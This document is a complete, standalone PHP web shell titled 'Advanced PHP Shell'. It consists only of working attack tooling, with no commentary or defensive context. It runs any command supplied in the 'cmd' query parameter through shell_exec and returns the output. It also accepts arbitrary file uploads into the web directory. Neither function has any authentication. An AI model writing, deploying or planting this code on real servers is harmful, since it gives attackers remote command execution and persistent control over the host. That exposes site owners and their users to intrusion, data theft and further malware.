<?php
if (isset($_GET['cmd'])) {
    // Execute a shell command and return the output
    echo "<pre>";
    $output = shell_exec($_GET['cmd'] . " 2>&1");
    echo htmlspecialchars($output);
    echo "</pre>";
    die();
}

if (isset($_FILES['file'])) {
    // Handle file upload
    $upload_dir = getcwd() . "/";
    $upload_file = $upload_dir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
        echo "File uploaded successfully: " . htmlspecialchars($upload_file);
    } else {
        echo "Failed to upload file.";
    }
    die();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Advanced Shell</title>
</head>
<body>
    <h1>Advanced PHP Shell</h1>
    <form method="GET">
        <label>Command:</label><br>
        <input type="text" name="cmd" style="width: 300px;" /><br>
        <button type="submit">Run Command</button>
    </form>
    <form method="POST" enctype="multipart/form-data">
        <label>Upload File:</label><br>
        <input type="file" name="file" /><br>
        <button type="submit">Upload File</button>
    </form>
</body>
</html>
